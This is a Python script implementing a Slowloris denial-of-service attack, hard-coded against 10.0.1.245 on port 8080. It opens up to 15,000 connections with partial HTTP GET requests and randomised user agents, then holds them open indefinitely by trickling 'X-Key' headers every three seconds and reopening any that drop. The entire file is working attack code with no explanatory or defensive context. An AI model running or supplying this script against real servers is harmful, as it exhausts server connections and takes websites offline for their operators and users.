import socket
import random
import time

from agents import random_agent

host = "10.0.1.245"
method = 'GET'
url = '/'
port = 8080
timing = 10

def send_line(s, data):
    s.send(bytes(f"{data}\r\n", 'utf8'))

def send_header(s, header, value):
    send_line(s, f"{header}: {value}")

def create_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    send_line(s, f"GET /?{random.randint(0, 1000000)} HTTP/1.1")
    send_header(s, "User-Agent", random_agent())
    return s



def loris(n, host, port, timing):
    # Open sockets
    print("Opening initial connections:", n)
    sockets = []
    for _ in range(n):
        sockets.append( create_socket(host, port) )
        print("\rOpen: %s" % len(sockets), end='')

    print()
    print("Initial sockets opened.")

    # Loop keepalive
    while True:
        for s in sockets:
            try:
                send_header(s, "X-Key", 'none')
            except:
                sockets.remove(s)

        print(f"Alive: {len(sockets)}/{n}")

        for _ in range(n - len(sockets)):
            sockets.append( create_socket(host, port) )

        time.sleep(3)
        
if __name__ == '__main__':
    #loris(1500, host, port, timing)
    loris(15000, host, port, timing)

    pass

    s = create_socket(host, port)
    time.sleep(3)
    send_header(s, 'Accept', 'text/html')
    time.sleep(3)
    send_header(s, 'Accept-Encoding', '*')
    time.sleep(3)
    #send_header(s, f"X-Key-{rand_str(16)}", random.randint(0, 65554))
    print(s.recv(1024))
    print('sent')
    #time.sleep(1)
        